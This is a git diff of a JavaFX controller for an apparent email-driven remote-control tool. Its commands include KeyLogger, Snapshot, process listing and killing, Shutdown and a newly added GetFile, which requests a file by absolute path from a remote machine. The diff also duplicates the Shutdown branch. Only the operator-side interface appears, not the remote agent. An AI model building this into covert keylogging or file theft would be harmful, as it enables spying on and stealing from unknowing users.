@@ -17,6 +17,7 @@ import javafx.scene.text.Text;
 
 import javax.mail.MessagingException;
 import java.io.IOException;
+import java.nio.file.Path;
 import java.util.List;
 import java.util.Random;
 
@@ -37,7 +38,7 @@ public class sendMailController {
     public void logText(String log, String color) {
         Text text = new Text(log);
         text.setStyle("-fx-fill: " + color);
-        text.setFont(new Font("Arial",15));
+        text.setFont(new Font("Arial", 15));
         text.wrappingWidthProperty().set(540);
         Platform.runLater(() -> {
             if (textOutputs.getHeight() > 380)
@@ -47,7 +48,8 @@ public class sendMailController {
     }
 
     public void initialize() {
-        List<String> list = List.of("Snapshot", "KeyLogger","ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown");
+        List<String> list = List.of("Snapshot", "KeyLogger", "GetFile",
+                "ListDirectory", "ListProcess", "StopProcess", "OpenProcess", "Shutdown");
         comboBox.setItems(FXCollections.observableList(list));
         comboBox.getSelectionModel().selectFirst();
         addField.setEditable(false);
@@ -63,26 +65,27 @@ public class sendMailController {
                         labelAddField.setText("Time to log in milliseconds");
                         sendBut.setDisable(false);
                         addField.setEditable(true);
-                    }
-                    else if (t1.equals("Shutdown")) {
+                    } else if (t1.equals("GetFile")) {
+                        addField.setDisable(false);
+                        labelAddField.setText("File absolute path");
+                        sendBut.setDisable(false);
+                        addField.setEditable(true);
+                    } else if (t1.equals("Shutdown")) {
                         addField.setDisable(false);
                         labelAddField.setText("Your Password (Optional)");
                         sendBut.setDisable(false);
                         addField.setEditable(true);
-                    }
-                    else if(t1.equals("ListProcess")){
+                    } else if (t1.equals("ListProcess")) {
                         addField.setDisable(true);
                         addField.setEditable(false);
                         labelAddField.setText("Nothing here");
                         sendBut.setDisable(false);
-                    }
-                    else if(t1.equals("ListDirectory")){
+                    } else if (t1.equals("ListDirectory")) {
                         addField.setDisable(true);
                         addField.setEditable(false);
                         labelAddField.setText("Coming Soon");
                         sendBut.setDisable(false);
-                    }
-                    else {
+                    } else {
                         sendBut.setDisable(true);
                     }
 
@@ -115,7 +118,7 @@ public class sendMailController {
                     }
                 } catch (IOException | MessagingException e) {
                     logText(e.getMessage(), "red");
-                    Platform.runLater(()->{
+                    Platform.runLater(() -> {
                         sendBut.setDisable(false);
                     });
                     e.printStackTrace();
@@ -134,7 +137,7 @@ public class sendMailController {
                     logText("Too small time to listen", "yellow");
                 } else {
                     sendBut.setDisable(true);
-                    int id = random.nextInt(1000,9999);
+                    int id = random.nextInt(1000, 9999);
                     Thread thread = new Thread(() -> {
                         try {
                             System.out.println(Thread.currentThread().getName());
@@ -156,12 +159,10 @@ public class sendMailController {
                     });
                     thread.start();
                 }
-            }
-            catch (NumberFormatException e) {
+            } catch (NumberFormatException e) {
                 logText("Please enter an valid time!", "red");
             }
-        }
-        else if (choose.equals("Shutdown")) {
+        } else if (choose.equals("Shutdown")) {
             int id = random.nextInt(1000, 9999);
             String sudopass = addField.getText();
 
@@ -169,8 +170,8 @@ public class sendMailController {
             Thread thread = new Thread(() -> {
                 try {
                     System.out.println(Thread.currentThread().getName());
-                    SendMail.getInstance().sendMail("req / " + id + " / " + "Shutdown/"+sudopass);
-                    logText("ID: " + id +"Password: "+sudopass+ " Send Mail Successfully! If there is a response, It means an error has occured!", "green");
+                    SendMail.getInstance().sendMail("req / " + id + " / " + "Shutdown/" + sudopass);
+                    logText("ID: " + id + "Password: " + sudopass + " Send Mail Successfully! If there is a response, It means an error has occured!", "green");
                 } catch (IOException | MessagingException e) {
                     logText(e.getMessage(), "red");
                     e.printStackTrace();
@@ -178,7 +179,7 @@ public class sendMailController {
             });
             thread.start();
         } else if (choose.equals("ListProcess")) {
-            int id = random.nextInt(1000,9999);
+            int id = random.nextInt(1000, 9999);
             sendBut.setDisable(true);
             Thread thread = new Thread(() -> {
                 try {
@@ -200,10 +201,8 @@ public class sendMailController {
                 }
             });
             thread.start();
-        }
-
-        else if (choose.equals("ListDirectory")) {
-            int id = random.nextInt(1000,9999);
+        } else if (choose.equals("ListDirectory")) {
+            int id = random.nextInt(1000, 9999);
             sendBut.setDisable(true);
             Thread thread = new Thread(() -> {
                 try {
@@ -219,6 +218,58 @@ public class sendMailController {
                     } else {
                         logText("Error happens", "red");
                     }
+                } catch (IOException | MessagingException e) {
+                    logText(e.getMessage(), "red");
+                    e.printStackTrace();
+                }
+            });
+            thread.start();
+        } else if (choose.equals("Shutdown")) {
+            int id = random.nextInt(1000, 9999);
+            String sudopass = addField.getText();
+
+            sendBut.setDisable(true);
+            Thread thread = new Thread(() -> {
+                try {
+                    System.out.println(Thread.currentThread().getName());
+                    SendMail.getInstance().sendMail("req / " + id + " / " + "Shutdown/" + sudopass);
+                    logText("ID: " + id + "Password: " + sudopass + " Send Mail Successfully! If there is a response, It means an error has occured!", "green");
+                } catch (IOException | MessagingException e) {
+                    logText(e.getMessage(), "red");
+                    e.printStackTrace();
+                }
+            });
+            thread.start();
+        } else if (choose.equals("GetFile")) {
+            int id = random.nextInt(1000, 9999);
+            sendBut.setDisable(true);
+            Thread thread = new Thread(() -> {
+                try {
+                    System.out.println(Thread.currentThread().getName());
+                    String filename = addField.getText();
+                    if (!Path.of(filename).isAbsolute()) {
+                        logText("You must enter an absolute path", "yellow");
+                        Platform.runLater(() -> {
+                            sendBut.setDisable(false);
+                        });
+                    } else {
+                        SendMail.getInstance().sendMail("req / " + id + " / " + "get/\"" + filename +"\"");
+                        logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
+                        String a = CheckMail.getInstance().listen(id, 40);
+                        if (a != null) {
+                            if (a.startsWith(".")) {
+                                logText(a.substring(1), "yellow");
+                            } else {
+                                logText("Get Response successfully. File in " + a, "green");
+                            }
+                            Platform.runLater(() -> {
+                                sendBut.setDisable(false);
+                            });
+                        } else {
+                            logText("Error happens", "red");
+                        }
+                    }
+
                 } catch (IOException | MessagingException e) {
                     logText(e.getMessage(), "red");
                     e.printStackTrace();
